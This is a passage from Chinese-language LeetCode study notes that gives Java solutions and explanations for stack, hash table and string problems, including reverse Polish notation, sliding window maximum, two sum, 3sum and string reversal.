\"ca\"。\n```\n\n------\n\n```java\n//栈\nclass Solution {\n    public String removeDuplicates(String s) {\n        Deque<Character> stack = new ArrayDeque<>();\n        for(char ch : s.toCharArray()){\n            if(stack.isEmpty() || stack.peek() != ch){\n                stack.push(ch);\n            } else{\n                stack.pop();\n            }\n        }\n        String str = \"\";\n        while(!stack.isEmpty()){\n            str =stack.pop() +str;\n        }\n        return str;\n    }\n}\n\n//数组\nclass Solution {\n    public String removeDuplicates(String s) {\n        char[] str = s.toCharArray();\n        int top = -1;\n        for (int i = 0; i < s.length(); i++) {\n            if (top == -1 || str[top] != str[i]) {\n                str[++top] = str[i];\n            } else {\n                top--;\n            }\n        }\n        return String.valueOf(str, 0, top + 1);\n    }\n}\n```\n\n#### [150. 逆波兰表达式求值](https://leetcode.cn/problems/evaluate-reverse-polish-notation/)\n\n根据 [逆波兰表示法](https://baike.baidu.com/item/%E9%80%86%E6%B3%A2%E5%85%B0%E5%BC%8F/128437)，求表达式的值。\n\n有效的算符包括 `+`、`-`、`*`、`/` 。每个运算对象可以是整数，也可以是另一个逆波兰表达式。\n\n**注意** 两个整数之间的除法只保留整数部分。\n\n可以保证给定的逆波兰表达式总是有效的。换句话说，表达式总会得出有效数值且不存在除数为 0 的情况。\n\n**示例 1：**\n\n```\n输入：tokens = [\"2\",\"1\",\"+\",\"3\",\"*\"]\n输出：9\n解释：该算式转化为常见的中缀算术表达式为：((2 + 1) * 3) = 9\n```\n\n**示例 2：**\n\n```\n输入：tokens = [\"4\",\"13\",\"5\",\"/\",\"+\"]\n输出：6\n解释：该算式转化为常见的中缀算术表达式为：(4 + (13 / 5)) = 6\n```\n\n**示例 3：**\n\n```\n输入：tokens = [\"10\",\"6\",\"9\",\"3\",\"+\",\"-11\",\"*\",\"/\",\"*\",\"17\",\"+\",\"5\",\"+\"]\n输出：22\n解释：该算式转化为常见的中缀算术表达式为：\n  ((10 * (6 / ((9 + 3) * -11))) + 17) + 5\n= ((10 * (6 / (12 * -11))) + 17) + 5\n= ((10 * (6 / -132)) + 17) + 5\n= ((10 * 0) + 17) + 5\n= (0 + 17) + 5\n= 17 + 5\n= 22\n```\n\n------\n\n```java\nclass Solution {\n    public int evalRPN(String[] tokens) {\n        Deque<Integer> stack = new ArrayDeque<>();\n         for(String s : tokens){\n            if (\"+-*/\".contains(s)) {\n                int a = stack.pop();\n                int b = stack.pop();\n                if(\"+\".equals(s))  stack.push(a + b);\n                else if(\"-\".equals(s))  stack.push(b - a);\n                else if(\"*\".equals(s))  stack.push(a * b);\n                else if(\"/\".equals(s))  stack.push(b / a);\n            } else {\n                stack.push(Integer.valueOf(s));\n            }\n         }\n        return stack.pop();\n    }\n}\n\nclass Solution {\n    public int evalRPN(String[] tokens) {\n        Deque<Integer> stack = new ArrayDeque<>();\n         for(String s : tokens){\n            if (\"+-*/\".contains(s)) {\n                int a = stack.pop();\n                int b = stack.pop();\n                switch(s){\n                    case \"+\": \n                        stack.push(a + b);\n                        break;\n                    case \"-\": \n                        stack.push(b - a);\n                        break;\n                    case \"*\": \n                        stack.push(a * b);\n                        break;\n                    case \"/\": \n                        stack.push(b / a);\n                        break;\n                }\n            } else {\n                stack.push(Integer.valueOf(s));\n            }\n         }\n        return stack.pop();\n    }\n}\n```\n\n#### [239. 滑动窗口最大值](https://leetcode.cn/problems/sliding-window-maximum/)\n\n给你一个整数数组 `nums`，有一个大小为 `k` 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 `k` 个数字。滑动窗口每次只向右移动一位。返回 *滑动窗口中的最大值* 。 \n\n**示例 1：**\n\n```\n输入：nums = [1,3,-1,-3,5,3,6,7], k = 3\n输出：[3,3,5,5,6,7]\n解释：\n滑动窗口的位置                最大值\n---------------               -----\n[1  3  -1] -3  5  3  6  7       3\n 1 [3  -1  -3] 5  3  6  7       3\n 1  3 [-1  -3  5] 3  6  7       5\n 1  3  -1 [-3  5  3] 6  7       5\n 1  3  -1  -3 [5  3  6] 7       6\n 1  3  -1  -3  5 [3  6  7]      7\n```\n\n**示例 2：**\n\n```\n输入：nums = [1], k = 1\n输出：[1]\n```\n\n------\n\n**方法一：优先队列**\n\n初始时，我们将数组 nums 的前 k 个元素和对应坐标放入优先队列中。\n\n每当向右移动窗口时，就把新的元素放入优先队列中，此时堆顶的元素就是堆中所有元素的最大值。\n\n特殊情况：到目前每次滑出窗口的元素并没有都从堆中删除，就会造成前面窗口的最大值一直在优先队列中，而窗口已经移走，最大值已经更换，前面窗口的最大值应该移出队列\n\n```java\nclass Solution {\n    public int[] maxSlidingWindow(int[] nums, int k) {\n        int n = nums.length;\n        // 1. 优先队列存放的是二元组(num,index) \n        // num :   是为了比较元素大小\n        // index : 是为了判断窗口的大小是否超出范围\n        PriorityQueue<int[]> pq = new PriorityQueue<int[]>(new Comparator<int[]>(){\n            public int compare(int[] pair1,int[] pair2){\n                //大顶堆（元素大小不同按元素大小排列，元素大小相同按下标进行排列）\n                return pair1[0] != pair2[0] ? pair2[0] - pair1[0]:pair2[1] - pair1[1];\n            }\n        });\n\n        // 2. 优先队列初始化 : k个元素的堆\n        for(int i = 0;i < k;i++){\n            pq.offer(new int[]{nums[i], i});\n        }\n\n        // 3. 处理堆逻辑\n        int[] res = new int[n - k + 1];            // 初始化结果数组长度 ：一共有 n - k + 1个窗口\n        res[0] = pq.peek()[0];                    // 初始化res[0] ： 拿出目前堆顶的元素\n        for(int i = k; i < n; i++){               // 向右移动滑动窗口\n            pq.offer(new int[]{nums[i],i});      // 加入大顶堆中\n            //特殊情况 当栈顶元素不在当前窗口范围就移除\n            while(pq.peek()[1] <= i - k){       // 将栈顶下标不在滑动窗口中就干掉\n                pq.poll();                      // 维护：堆的大小就是滑动窗口的大小\n            }   \n            res[i - k + 1] = pq.peek()[0];      // 此时堆顶元素就是滑动窗口的最大值\n        }\n        return res;\n    }\n}\n```\n\n**方法二：单调队列**\n\n```java\nclass Solution {\n    public int[] maxSlidingWindow(int[] nums, int k) {\n        if(nums == null || nums.length < 2){\n            return nums;\n        }\n        // 维护一个单调递减的双端队列，存元素坐标(方便判断队首的值是否在窗口范围)\n        Deque<Integer> deque = new LinkedList<>();\n        // 存储最后返回结果\n        int[] res = new int[nums.length - k + 1];\n\n        for(int i = 0; i < nums.length; i++){\n            // 清理不在窗口范围的元素\n            if(!deque.isEmpty() && deque.peek() <= i - k){\n                deque.pollFirst();\n            }\n            // 删除所有比新入队元素小的旧元素\n            while(!deque.isEmpty() && nums[deque.peekLast()] <= nums[i]){\n                deque.pollLast();\n            }\n            // 新元素入队\n            deque.addLast(i);\n            // 当窗口长度为k时 开始保存窗口中最大值\n            if(i + 1 >= k){\n                res[i + 1 - k] = nums[deque.peekFirst()];\n            }\n        }\n        return res;\n    }\n}\n```\n\n\n\n#### [347. 前 K 个高频元素](https://leetcode.cn/problems/top-k-frequent-elements/)\n\n给你一个整数数组 `nums` 和一个整数 `k` ，请你返回其中出现频率前 `k` 高的元素。你可以按 **任意顺序** 返回答案。\n\n**示例 1:**\n\n```\n输入: nums = [1,1,1,2,2,3], k = 2\n输出: [1,2]\n```\n\n**示例 2:**\n\n```\n输入: nums = [1], k = 1\n输出: [1]\n```\n\n------\n\n```java\nclass Solution {\n    public int[] topKFrequent(int[] nums, int k) {\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int i : nums){\n            map.put(i, map.getOrDefault(i, 0) + 1);\n        }\n\n        // int[] 的第一个元素代表数组的值，第二个元素代表了该值出现的次数\n         // 队列按照键值对中的值（元素出现频率）从小到大排序\n        PriorityQueue<int[]> queue = new PriorityQueue<int[]>(new Comparator<int[]>() {\n            public int compare(int[] m, int[] n) {\n                return m[1] - n[1];\n            }\n        });\n        // 遍历map，用最小堆保存频率最大的k个元素\n        for (Map.Entry<Integer, Integer> entry : map.entrySet()) {\n            int num = entry.getKey(), count = entry.getValue();\n            if (queue.size() == k) {\n                if (queue.peek()[1] < count) {\n                    queue.poll();\n                    queue.offer(new int[]{num, count});\n                }\n            } else {\n                queue.offer(new int[]{num, count});\n            }\n        }\n        \n        int[] ret = new int[k];\n        for (int i = 0; i < k; ++i) {\n            ret[i] = queue.poll()[0];\n        }\n        return ret;\n    }\n}\n\n\nclass Solution {\n    public int[] topKFrequent(int[] nums, int k) {\n        // 统计每个元素出现的次数，元素为键，元素出现的次数为值\n        Map<Integer, Integer> map = new HashMap<>();\n        for(int i : nums){\n            map.put(i, map.getOrDefault(i, 0) + 1);\n        }\n\n         // 队列按照键值对中的值（元素出现频率）从小到大排序\n        PriorityQueue<Integer> queue = new PriorityQueue<>(new Comparator<Integer>() {\n            @Override\n            public int compare(Integer a, Integer b) {\n                return map.get(a) - map.get(b);\n            }\n        });\n        // 遍历map，用最小堆保存频率最大的k个元素\n        for(Integer key : map.keySet()){\n            if (queue.size() < k) {\n                queue.offer(key);\n            } else if (map.get(key) > map.get(queue.peek())) {\n                queue.poll();\n                queue.offer(key);\n            }\n        }\n\n        int[] ret = new int[k];\n        for (int i = 0; i < k; ++i) {\n            ret[i] = queue.poll();\n        }\n        return ret;\n    }\n}\n```\n\n\n\n## ④哈希表\n\n### ❶基础知识\n\n哈希表(Hash table)，是根据**关键码值**(Key value)而直接进行访问的数据结构。也就是说，它通过把关键码值映射到表中一个位置来访问记录，以加快查找的速度。这个映射函数叫做散列函数，存放记录的数组叫做哈希表。\n\n常见的三种哈希结构\n\n- 数组\n\n```java\nint[] hashTable = new int[26]; //存26字母索引\n\n//hashTable[s.charAt(i) - 'a']++; 字母存在则在对应位置加1\n```\n\n- set （集合）\n\n```java\nSet<Integer> set = new HashSet<>();\n\n//set.add(num) 插入元素\n//set.contains(num) 查找键是否存在\n```\n\n- map（映射）\n\n```java\nMap<Integer, Integer> map = new HashMap<>();\n\n//map.put(key,value) 插入元素\n//map.getOrDefault(ch, 0); 查询map是否存在ch,不存在设置默认值0\n//map.values()  返回所有value\n//map.containsKey(key) 查找键是否存在\n//map.isEmpty() 判断是否为空\n//map.get() 根据键获取值\n//map.remove() 根据键删除映射关系\n```\n\n### ❷LeetCode真题\n\n#### [242. 有效的字母异位词](https://leetcode.cn/problems/valid-anagram/)\n\n给定两个字符串 `_s_` 和 `_t_` ，编写一个函数来判断 `_t_` 是否是 `_s_` 的字母异位词。\n\n**注意：**若 `_s_` 和 `_t_` 中每个字符出现的次数都相同，则称 `_s_` 和 `_t_` 互为字母异位词。\n\n**示例 1:**\n\n```\n输入: s = \"anagram\", t = \"nagaram\"\n输出: true\n```\n\n**示例 2:**\n\n```\n输入: s = \"rat\", t = \"car\"\n输出: false\n```\n\n------\n\n**方法1：哈希表**\n\n- 首先判断两个字符串长度是否相等，不相等则直接返回 false\n\n- 若相等，则初始化 26 个字母哈希表，遍历字符串 s 和 t\n- s 负责在对应位置增加，t 负责在对应位置减少\n- 如果哈希表的值都为 0，则二者是字母异位词\n\n```java\n//O(n)\nclass Solution {\n    public boolean isAnagram(String s, String t) {\n        if(s.length() != t.length()){\n            return false;\n        }\n        int[] hashTable = new int[26];\n        for(int i = 0; i < s.length(); i++){\n            hashTable[s.charAt(i) - 'a']++;\n            hashTable[t.charAt(i) - 'a']--;\n        }\n        for(int i = 0; i < 26; i++){\n            if(hashTable[i] != 0) \n                return false;\n        }\n        return true;\n    }\n}\n```\n\n**方法2：排序**\nt 是 s 的异位词等价于「两个字符串排序后相等」。因此我们可以对字符串 s 和 t 分别排序，看排序后的字符串是否相等即可判断。此外，如果 s 和 t 的长度不同，t 必然不是 s 的异位词。\n\n```java\n//O(nlog⁡n)\nclass Solution {\n    public boolean isAnagram(String s, String t) {\n        if (s.length() != t.length()) {\n            return false;\n        }\n        char[] str1 = s.toCharArray();\n        char[] str2 = t.toCharArray();\n        Arrays.sort(str1);\n        Arrays.sort(str2);\n        return Arrays.equals(str1, str2);\n    }\n}\n```\n\n#### [49. 字母异位词分组 ](https://leetcode.cn/problems/group-anagrams/)\n\n给你一个字符串数组，请你将 **字母异位词** 组合在一起。可以按任意顺序返回结果列表。\n\n**字母异位词** 是由重新排列源单词的字母得到的一个新单词，所有源单词中的字母通常恰好只用一次。\n\n**示例 1:**\n\n```\n输入: strs = [\"eat\", \"tea\", \"tan\", \"ate\", \"nat\", \"bat\"]\n输出: [[\"bat\"],[\"nat\",\"tan\"],[\"ate\",\"eat\",\"tea\"]]\n```\n\n**示例 2:**\n\n```\n输入: strs = [\"\"]\n输出: [[\"\"]]\n```\n\n**示例 3:**\n\n```\n输入: strs = [\"a\"]\n输出: [[\"a\"]]\n```\n\n------\n\n**方法1：排序**\n\n遍历字符串数组，对每个字符串中的字符排序，加入map对应的key的数组中。\n\n```java\nclass Solution {\n    public List<List<String>> groupAnagrams(String[] strs) {\n        Map<String,List<String>> map = new HashMap<>();\n        for(String str : strs){\n            char[] arr = str.toCharArray();\n            Arrays.sort(arr);\n            String key = new String(arr);\n            List<String> list = map.getOrDefault(key, new ArrayList<String>());\n            list.add(str);\n            map.put(key, list);\n        }\n        return new ArrayList<List<String>>(map.values());\n    }\n}\n```\n\n**方法2：计数**\n由于互为字母异位词的两个字符串包含的字母相同，因此两个字符串中的相同字母出现的次数一定是相同的，故可以将每个字母出现的次数使用字符串表示，作为哈希表的键。\n\n由于字符串只包含小写字母，因此对于每个字符串，可以使用长度为 26 的数组记录每个字母出现的次数。\n\n```java\nclass Solution {\n    public List<List<String>> groupAnagrams(String[] strs) {\n        Map<String, List<String>> map = new HashMap<String, List<String>>();\n        for (String str : strs) {\n            int[] counts = new int[26];\n            int length = str.length();\n            for (int i = 0; i < length; i++) {\n                counts[str.charAt(i) - 'a']++;\n            }\n            // 将每个出现次数大于 0 的字母和出现次数按顺序拼接成字符串，作为哈希表的键\n            StringBuffer sb = new StringBuffer();\n            for (int i = 0; i < 26; i++) {\n                if (counts[i] != 0) {\n                    sb.append((char) ('a' + i));\n                    sb.append(counts[i]);\n                }\n            }\n            String key = sb.toString();\n            List<String> list = map.getOrDefault(key, new ArrayList<String>());\n            list.add(str);\n            map.put(key, list);\n        }\n        return new ArrayList<List<String>>(map.values());\n    }\n}\n```\n\n#### [349. 两个数组的交集](https://leetcode.cn/problems/intersection-of-two-arrays/)\n\n给定两个数组 `nums1` 和 `nums2` ，返回它们的交集 。输出结果中的每个元素一定是 **唯一** 的。我们可以 **不考虑输出结果的顺序** 。\n\n**示例 1：**\n\n```\n输入：nums1 = [1,2,2,1], nums2 = [2,2]\n输出：[2]\n```\n\n**示例 2：**\n\n```\n输入：nums1 = [4,9,5], nums2 = [9,4,9,8,4]\n输出：[9,4]\n解释：[4,9] 也是可通过的\n```\n\n------\n\n```java\nclass Solution {\n    public int[] intersection(int[] nums1, int[] nums2) {\n      \n        Set<Integer> set1 = new HashSet<>();\n        Set<Integer> set2 = new HashSet<>();\n        //对nums1去重并存入set1\n        for(int i = 0; i < nums1.length; i++){\n            set1.add(nums1[i]);\n        }\n        //nums2与set对比，相同元素存入set2\n        for(int num : nums2){\n            if(set1.contains(num)){\n                set2.add(num);\n            }\n        }\n        //将set2转化为数组\n        int[] res = new int[set2.size()];\n        int index = 0;\n        for(int num : set2){\n            res[index++] = num;\n        }\n        //方法2:将set2转化为数组\n        //int[] res = set2.stream().mapToInt(Integer::valueOf).toArray();\n        return res;\n    }\n}\n```\n\n#### [202. 快乐数](https://leetcode.cn/problems/happy-number/)\n\n编写一个算法来判断一个数 `n` 是不是快乐数。\n\n**「快乐数」** 定义为：\n\n-   对于一个正整数，每一次将该数替换为它每个位置上的数字的平方和。\n-   然后重复这个过程直到这个数变为 1，也可能是 **无限循环** 但始终变不到 1。\n-   如果这个过程 **结果为** 1，那么这个数就是快乐数。\n\n如果 `n` 是 快乐数 就返回 `true` ；不是，则返回 `false` 。\n\n**示例 1：**\n\n```\n输入：n = 19\n输出：true\n解释：\n1^2 + 9^2 = 82\n8^2 + 2^2 = 68\n6^2 + 8^2 = 100\n1^2 + 0^2 + 0^2 = 1\n```\n\n**示例 2：**\n\n```\n输入：n = 2\n输出：false\n```\n\n------\n\n1. 给一个数字 n，循环计算下一个数字，直到等于1\n2. 使用Set判断我们是否进入了一个循环。\n\n```java\nclass Solution {\n    public boolean isHappy(int n) {\n        Set<Integer> set = new HashSet<>();\n        while(n != 1 && !set.contains(n)){\n            set.add(n);\n            n = getNextNum(n);\n        }\n        return n == 1;\n    }\n\n    public int getNextNum(int n) {\n        int nextNum = 0;\n        while(n > 0){\n            int temp = n % 10;\n            nextNum += temp * temp;\n            n = n / 10;\n        }\n        return nextNum;\n    }\n\n```\n\n#### [1. 两数之和](https://leetcode.cn/problems/two-sum/)\n\n给定一个整数数组 `nums` 和一个整数目标值 `target`，请你在该数组中找出 **和为目标值** _`target`_  的那 **两个** 整数，并返回它们的数组下标。\n\n你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。\n\n你可以按任意顺序返回答案。\n\n**示例 1：**\n\n```\n输入：nums = [2,7,11,15], target = 9\n输出：[0,1]\n解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。\n```\n\n**示例 2：**\n\n```\n输入：nums = [3,2,4], target = 6\n输出：[1,2]\n```\n\n**示例 3：**\n\n```\n输入：nums = [3,3], target = 6\n输出：[0,1]\n```\n\n------\n\n```java\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n        HashMap<Integer,Integer> map = new HashMap<>();\n        for(int i = 0; i < nums.length; i++){\n            if(map.containsKey(target - nums[i])){\n                return new int[]{map.get(target - nums[i]),i};\n            }\n            map.put(nums[i],i);\n        }\n        return new int[0];\n    }\n}\n```\n\n#### [454. 四数相加 II ](https://leetcode.cn/problems/4sum-ii/description/)\n\n给你四个整数数组 `nums1`、`nums2`、`nums3` 和 `nums4` ，数组长度都是 `n` ，请你计算有多少个元组 `(i, j, k, l)` 能满足：\n\n-   `0 <= i, j, k, l < n`\n-   `nums1[i] + nums2[j] + nums3[k] + nums4[l] == 0`\n\n**示例 1：**\n\n```properties\n输入：nums1 = [1,2], nums2 = [-2,-1], nums3 = [-1,2], nums4 = [0,2]\n输出：2\n解释：\n两个元组如下：\n1. (0, 0, 0, 1) -> nums1[0] + nums2[0] + nums3[0] + nums4[1] = 1 + (-2) + (-1) + 2 = 0\n2. (1, 1, 0, 0) -> nums1[1] + nums2[1] + nums3[0] + nums4[0] = 2 + (-1) + (-1) + 0 = 0\n```\n\n**示例 2：**\n\n```properties\n输入：nums1 = [0], nums2 = [0], nums3 = [0], nums4 = [0]\n输出：1\n```\n\n该题等价于 计算 a + b + c + d = 0\n\n1. 首先定义 map，key放a和b两数之和，value 放a和b两数之和出现的次数。\n2. 遍历数组1和2，统计两个数组元素之和，和出现的次数，放到map中。\n3. 定义int变量res，用来统计 a+b+c+d = 0 出现的次数。\n4. 再遍历数组3和4，找到如果 0-(c+d) 在map中出现过的话，就把map中key对应的value统计出来。\n5. 最后返回统计值 res 就可以了\n\n```java\nclass Solution {\n    public int fourSumCount(int[] nums1, int[] nums2, int[] nums3, int[] nums4) {\n        Map<Integer, Integer> map = new HashMap<>();\n        //key放两数之和，value放两数之和出现的次数。\n        for(int i : nums1){\n            for(int j: nums2){\n                map.put(i + j, map.getOrDefault(i + j, 0) + 1);\n            }\n        }\n        int res = 0;\n        //如果在map中出现过的话，就把map中key对应的value也就是出现次数统计出来。\n        for(int i : nums3){\n            for(int j: nums4){\n                if(map.containsKey(0 - (i + j))){\n                    res += map.get(0 - (i + j));\n                }\n            }\n        }\n        return res;\n    }\n}\n```\n\n#### [383. 赎金信](https://leetcode.cn/problems/ransom-note/)\n\n给你两个字符串：`ransomNote` 和 `magazine` ，判断 `ransomNote` 能不能由 `magazine` 里面的字符构成。\n\n如果可以，返回 `true` ；否则返回 `false` 。\n\n`magazine` 中的每个字符只能在 `ransomNote` 中使用一次。\n\n**示例 1：**\n\n```properties\n输入：ransomNote = \"a\", magazine = \"b\"\n输出：false\n```\n\n**示例 2：**\n\n```properties\n输入：ransomNote = \"aa\", magazine = \"ab\"\n输出：false\n```\n\n**示例 3：**\n\n```properties\n输入：ransomNote = \"aa\", magazine = \"aab\"\n输出：true\n```\n\n------\n\n```java\n//map实现\nclass Solution {\n    public boolean canConstruct(String ransomNote, String magazine) {\n        Map<Character, Integer> map = new HashMap<>();\n        for(char ch : magazine.toCharArray()){\n            map.put(ch, map.getOrDefault(ch, 0) + 1);\n        }\n        for(char ch : ransomNote.toCharArray()){\n            map.put(ch, map.getOrDefault(ch, 0) - 1);\n        }\n        for(Integer value : map.values() ){\n            if(value < 0) return false;\n        }\n        return true;\n    }\n}\n//哈希表实现\nclass Solution {\n    public boolean canConstruct(String ransomNote, String magazine) {\n        int[] hashTable = new int[26];\n        for(char ch : magazine.toCharArray()){\n            hashTable[ch - 'a']++;\n        }\n        for(char ch : ransomNote.toCharArray()){\n            hashTable[ch - 'a']--;\n        }\n        for(int value : hashTable){\n            if(value < 0){\n                return false;\n            }\n        }\n        return true;\n    }\n}\n//优化\nclass Solution {\n    public boolean canConstruct(String ransomNote, String magazine) {\n        int[] hashTable = new int[26];\n        for (char ch : magazine.toCharArray()) {\n            hashTable[ch - 'a']++;\n        }\n        // 合二为一\n        for (char ch : ransomNote.toCharArray()) {\n            if (--hashTable[ch - 'a'] < 0)\n                return false;\n        }\n        return true;\n    }\n}\n```\n\n#### [15. 三数之和](https://leetcode.cn/problems/3sum/)\n\n给你一个整数数组 `nums` ，判断是否存在三元组 `[nums[i], nums[j], nums[k]]` 满足 `i != j`、`i != k` 且 `j != k` ，同时还满足 `nums[i] + nums[j] + nums[k] == 0` 。请你返回所有和为 `0` 且不重复的三元组。\n\n**注意：**答案中不可以包含重复的三元组。\n\n**示例 1：**\n\n```properties\n输入：nums = [-1,0,1,2,-1,-4]\n输出：[[-1,-1,2],[-1,0,1]]\n解释：\nnums[0] + nums[1] + nums[2] = (-1) + 0 + 1 = 0 。\nnums[1] + nums[2] + nums[4] = 0 + 1 + (-1) = 0 。\nnums[0] + nums[3] + nums[4] = (-1) + 2 + (-1) = 0 。\n不同的三元组是 [-1,0,1] 和 [-1,-1,2] 。\n注意，输出的顺序和三元组的顺序并不重要。\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [0,1,1]\n输出：[]\n解释：唯一可能的三元组和不为 0 。\n```\n\n**示例 3：**\n\n```properties\n输入：nums = [0,0,0]\n输出：[[0,0,0]]\n解释：唯一可能的三元组和为 0 。\n```\n\n------\n\n```java\n//三重暴力循环：超出时间限制\nprivate List<List<Integer>> directlySolution(int[] nums) {\n    if (nums == null || nums.length <= 2) {\n        return Collections.emptyList();\n    }\n    Arrays.sort(nums);\n    Set<List<Integer>> result = new LinkedHashSet<>();\n    for (int i = 0; i < nums.length; i++) {\n        for (int j = i+1; j < nums.length; j++) {\n            for (int k = j+1; k < nums.length; k++) {\n                if (nums[i] + nums[j] + nums[k] == 0) {\n                    List<Integer> value = Arrays.asList(nums[i], nums[j], nums[k]);\n                    result.add(value);\n                }\n            }\n        }\n    }\n\n    return new ArrayList<>(result);\n}\n```\n\n```java\n//两重暴力+hash\nclass Solution {\n    public List<List<Integer>> threeSum(int[] nums) {\n        List<List<Integer>> result = new ArrayList<>();\n        Map<Integer, Integer> map = new HashMap<>();\n        //把所有数组元素载入map\n        for(int i = 0; i < nums.length; i++){\n            map.put(nums[i], i);\n        }\n        for(int i = 0; i < nums.length; i++){\n            for(int j = i + 1; j < nums.length; j++){\n                int c = 0 - (nums[i] + nums[j]);\n                if(map.containsKey(c) && map.get(c) > j){\n                    List<Integer> list = new ArrayList<>();\n                    list.add(nums[i]);\n                    list.add(nums[j]);\n                    list.add(c);\n                    Collections.sort(list);//排序，方便去重\n                    if(!result.contains(list)){\n                        result.add(list);\n                    }\n                }  \n            }\n        }\n        return result;\n    }\n}\n```\n\n```java\n//双指针\nclass Solution {\n    public static List<List<Integer>> threeSum(int[] nums) {\n        List<List<Integer>> ans = new ArrayList();\n        int len = nums.length;\n        if(nums == null || len < 3) return ans;\n        Arrays.sort(nums); // 排序\n        for (int i = 0; i < len ; i++) {\n            //如果第一个就大于0，则三数之和一定大于0，结束循环\n            if(nums[i] > 0) break; \n            //如果连续两个元素相等就跳过第二个，避免重复\n            if(i > 0 && nums[i] == nums[i-1]) continue; // 去重\n            int L = i + 1;\n            int R = len - 1;\n            while(L < R){\n                int sum = nums[i] + nums[L] + nums[R];\n                if (sum < 0) L++;\n                else if (sum > 0) R--;\n                else if(sum == 0){\n                    ans.add(Arrays.asList(nums[i],nums[L],nums[R]));\n                    while (L < R && nums[L] == nums[L+1]) L++; // 去重\n                    while (L < R && nums[R] == nums[R-1]) R--; // 去重\n                    L++;\n                    R--;\n                }\n            }\n        }        \n        return ans;\n    }\n}\n```\n\n#### [18. 四数之和](https://leetcode.cn/problems/4sum/)\n\n给你一个由 `n` 个整数组成的数组 `nums` ，和一个目标值 `target` 。请你找出并返回满足下述全部条件且**不重复**的四元组 `[nums[a], nums[b], nums[c], nums[d]]` （若两个四元组元素一一对应，则认为两个四元组重复）：\n\n-   `0 <= a, b, c, d < n`\n-   `a`、`b`、`c` 和 `d` **互不相同**\n-   `nums[a] + nums[b] + nums[c] + nums[d] == target`\n\n你可以按 **任意顺序** 返回答案 。\n\n**示例 1：**\n\n```properties\n输入：nums = [1,0,-1,0,-2,2], target = 0\n输出：[[-2,-1,1,2],[-2,0,0,2],[-1,0,0,1]]\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [2,2,2,2,2], target = 8\n输出：[[2,2,2,2]]\n```\n\n------\n\n```java\nclass Solution {\n    public List<List<Integer>> fourSum(int[] nums, int target) {\n        List<List<Integer>> res = new ArrayList<>();\n        Arrays.sort(nums);\n        for(int i = 0; i < nums.length; i++){\n            if(nums[i] > 0 && nums[i] > target) break; //去重\n            if(i > 0 && nums[i] == nums[i -1]) continue; //去重\n            for(int j = i + 1; j < nums.length; j++){\n                if (j > i + 1 && nums[j - 1] == nums[j]) continue; //去重\n                int L = j + 1, R = nums.length - 1;\n                while(L < R) {\n                    int sum = nums[i] + nums[j] + nums[L] + nums[R];\n                    if(sum > target) R--;\n                    else if(sum < target) L++;\n                    else {\n                        res.add(Arrays.asList(nums[i],nums[j],nums[L],nums[R]));\n                        while(L < R && nums[L] == nums[L + 1]) L++; //去重\n                        while(L < R && nums[R] == nums[R - 1]) R--; //去重\n                        L++; \n                        R--;\n                    }\n                }  \n            }\n        }\n        return res;\n    }\n}\n```\n\n## ⑤字符串\n\n### [344. 反转字符串](https://leetcode.cn/problems/reverse-string/)\n\n编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 `s` 的形式给出。\n\n不要给另外的数组分配额外的空间，你必须**原地修改输入数组**、使用 O(1) 的额外空间解决这一问题。\n\n**示例 1：**\n\n```properties\n输入：s = [\"h\",\"e\",\"l\",\"l\",\"o\"]\n输出：[\"o\",\"l\",\"l\",\"e\",\"h\"]\n```\n\n**示例 2：**\n\n```properties\n输入：s = [\"H\",\"a\",\"n\",\"n\",\"a\",\"h\"]\n输出：[\"h\",\"a\",\"n\",\"n\",\"a\",\"H\"]\n```\n\n------\n\n```java\nclass Solution {\n    public void reverseString(char[] s) {\n        int left = 0, right = s.length - 1;\n        while(left < right){\n            char tmp  = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n            left++;\n            right--;\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int n = s.length;\n        for (int left = 0, right = n - 1; left < right; ++left, --right) {\n            char tmp = s[left];\n            s[left] = s[right];\n            s[right] = tmp;\n        }\n    }\n}\n  \nclass Solution {\n    public void reverseString(char[] s) {\n        int l = 0;\n        int r = s.length - 1;\n        while (l < r) {\n            s[l] ^= s[r];  //构造 a ^ b 的结果，并放在 a 中\n            s[r] ^= s[l];  //将 a ^ b 这一结果再 ^ b ，存入b中，此时 b = a, a = a ^ b\n            s[l] ^= s[r];  //a ^ b 的结果再 ^ a ，存入 a 中，此时 b = a, a = b 完成交换\n            l++;\n            r--;\n        }\n    }\n}  \n```\n\n### [541. 反转字符串 II](https://leetcode.cn/problems/reverse-string-ii/)\n\n给定一个字符串 `s` 和一个整数 `k`，从字符串开头算起，每计数至 `2k` 个字符，就反转这 `2k` 字符中的前 `k` 个字符。\n\n-   如果剩余字符少于 `k` 个，则将剩余字符全部反转。\n-   如果剩余字符小于 `2k` 但大于或等于 `k` 个，则反转前 `k` 个字符，其余字符保持原样。\n\n**示例 1：**\n\n```properties\n输入：s = \"abcdefg\", k = 2\n输出：\"bacdfeg\"\n```\n\n**示例 2：**\n\n```properties\n输入：s = \"abcd\", k = 2\n输出：\"bacd\"\n```\n\n------\n\n题意：每隔2k个反转前k个，尾数不够k个时候全部反转\n\n```java\nclass Solution {\n    public String reverseStr(String s, int k) {\n        int n = s.length();\n        char[] arr = s.toCharArray();\n        // 1. 每隔 2k 个字符的前 k 个字符进行反转\n        for (int i = 0; i< n; i += 2 * k) {\n            // 2. 剩余字符小于 2k 但大于或等于 k 个，则反转前 k 个字符\n            if (i + k <= n) {\n                reverse(arr, i, i + k -1);\n                continue;\n            }\n            // 3. 剩余字符少于 k 个，则将剩余字符全部反转\n            reverse(arr, i, n - 1);\n        }\n        return  new String(arr);\n    }\n    // 定义翻转函数\n    public void reverse(char[] arr, int left, int right) {\n        while (left < right) {\n            char temp = arr[left];\n            arr[left] = arr[right];\n            arr[right] = temp;\n            left++;\n            right--;\n        }\n    }\n}\n\n\n\nclass Solution {\n    public String reverseStr(String s, int k) {\n        int n = s.length();\n        char[] arr = s.toCharArray();\n      \n        for (int i = 0; i < n; i += 2 * k) {\n             // 1. 每隔 2k 个字符的前 k 个字符进行反转\n            // 2. 剩余字符小于 2k 但大于或等于 k 